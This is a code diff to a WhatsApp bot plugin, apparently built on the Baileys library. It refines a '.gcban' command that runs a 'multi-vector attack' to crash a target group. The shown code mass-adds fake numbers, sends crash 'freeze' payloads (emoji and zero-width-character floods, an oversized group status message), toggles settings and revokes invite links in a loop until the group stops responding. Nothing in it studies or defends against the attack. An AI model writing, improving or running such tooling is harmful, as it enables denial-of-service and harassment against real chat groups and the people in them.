@@ -37,6 +37,32 @@ function fakeJid() {
     return `${c.p}${n}@s.whatsapp.net`;
 }
 
+// ─── Normalize JID (strips :XX device suffix) ─────────────────────────────────
+function normalizeJid(jid = "") {
+    return jid.replace(/:\d+@/, "@").trim().toLowerCase();
+}
+
+// ─── Owner check ──────────────────────────────────────────────────────────────
+function checkOwner(conn, m) {
+    const sender = normalizeJid(m.sender || "");
+
+    // 1. bot's own number is always owner
+    const botJid = normalizeJid(conn.decodeJid?.(conn.user?.id) || conn.user?.id || "");
+    if (sender === botJid) return true;
+
+    // 2. check against configured OWNER_NUMBER (supports string or array)
+    const raw = conn.authState?.creds?.me?.id
+        ?? global.ownerNumber
+        ?? process.env.OWNER_NUMBER
+        ?? "";
+
+    const ownerList = Array.isArray(raw) ? raw : [raw];
+    return ownerList.some(o => {
+        const clean = String(o).replace(/[^0-9]/g, "");
+        return sender.startsWith(clean) || sender === `${clean}@s.whatsapp.net`;
+    });
+}
+
 // ─── Resolve invite link → JID ────────────────────────────────────────────────
 async function resolveJid(conn, raw) {
     raw = String(raw || "").trim();
@@ -61,13 +87,13 @@ async function isDead(conn, jid) {
         const meta = await conn.groupMetadata(jid);
         return !meta?.participants?.length;
     } catch (e) {
-        const m = String(e?.message || "").toLowerCase();
-        const c = e?.output?.statusCode ?? e?.data?.output?.statusCode;
+        const msg = String(e?.message || "").toLowerCase();
+        const code = e?.output?.statusCode ?? e?.data?.output?.statusCode;
         return (
-            c === 401 || c === 403 || c === 404 ||
-            m.includes("forbidden") || m.includes("not-authorized") ||
-            m.includes("item-not-found") || m.includes("gone") ||
-            m.includes("not found") || m.includes("not a participant")
+            code === 401 || code === 403 || code === 404 ||
+            msg.includes("forbidden") || msg.includes("not-authorized") ||
+            msg.includes("item-not-found") || msg.includes("gone") ||
+            msg.includes("not found") || msg.includes("not a participant")
         );
     }
 }
@@ -86,7 +112,6 @@ async function attackAdd(conn, jid, count) {
 // ─── ATTACK 2: Freeze payload (crashes group) ─────────────────────────────────
 async function attackFreeze(conn, jid) {
     const payloads = [
-        // Payload A — interactive message overflow
         {
             interactiveMessage: {
                 body: { text: "💀".repeat(2000) },
@@ -94,7 +119,6 @@ async function attackFreeze(conn, jid) {
                 contextInfo: { quotedMessage: { stickerPackMessage: {} } },
             }
         },
-        // Payload B — extended text flood
         {
             extendedTextMessage: {
                 text: "​".repeat(65535),
@@ -105,7 +129,6 @@ async function attackFreeze(conn, jid) {
                 }
             }
         },
-        // Payload C — group description overflow
         {
             groupStatusMessageV2: {
                 message: {
@@ -159,9 +182,11 @@ cmd({
     desc: "ULTRA GC BAN — multi-vector attack (OWNER ONLY)",
     category: "owner",
     filename: __filename
-}, async (conn, mek, m, { from, reply, args, isOwner }) => {
+}, async (conn, mek, m, { from, reply, args }) => {
 
-    if (!isOwner) return reply("❌ Owner only.");
+    // ─── Owner gate (robust, bypasses broken isOwner from handler) ────────────
+    if (!checkOwner(conn, m)) return reply("❌ Owner only.");
+
     if (!args[0]) return reply(
         `📌 *Usage:* .gcban <group_link or @g.us JID>\n\n` +
         `*Example:*\n.gcban https://chat.whatsapp.com/XXXXXX`
@@ -171,10 +196,9 @@ cmd({
     const targetJid = await resolveJid(conn, args[0]);
     if (!targetJid) return reply("❌ Invalid group link or JID. Provide a valid invite link.");
 
-    const MAX_ROUNDS    = 50;
-    const ADDS_PER_ROUND = 100;  // fake numbers added per round
-    const BATCH_DELAY   = 100;
-    const ROUND_DELAY   = 150;
+    const MAX_ROUNDS     = 50;
+    const ADDS_PER_ROUND = 100;
+    const ROUND_DELAY    = 150;
 
     let round     = 0;
     let totalAdds = 0;
@@ -194,23 +218,16 @@ cmd({
     while (!dead && round < MAX_ROUNDS) {
         round++;
 
-        // Vector 1 — Add spam (100 fake numbers simultaneously)
         await attackAdd(conn, targetJid, ADDS_PER_ROUND);
         totalAdds += ADDS_PER_ROUND;
 
-        // Vector 2 — Freeze payloads (3 different crash payloads)
         await attackFreeze(conn, targetJid);
 
-        // Vector 3 — Settings toggle spam (every 3 rounds)
         if (round % 3 === 0) await attackSettings(conn, targetJid);
-
-        // Vector 4 — Invite link revoke spam (every 5 rounds)
         if (round % 5 === 0) await attackInvite(conn, targetJid);
 
-        // ─── Check if group is dead ───────────────────────────
         dead = await isDead(conn, targetJid);
 
-        // ─── Update progress ──────────────────────────────────
         if (initMsg?.key && round % 2 === 0) {
             await conn.sendMessage(from, {
                 text: `💀 *ULTRA GC BAN — ROUND ${round}/${MAX_ROUNDS}*\n\n` +
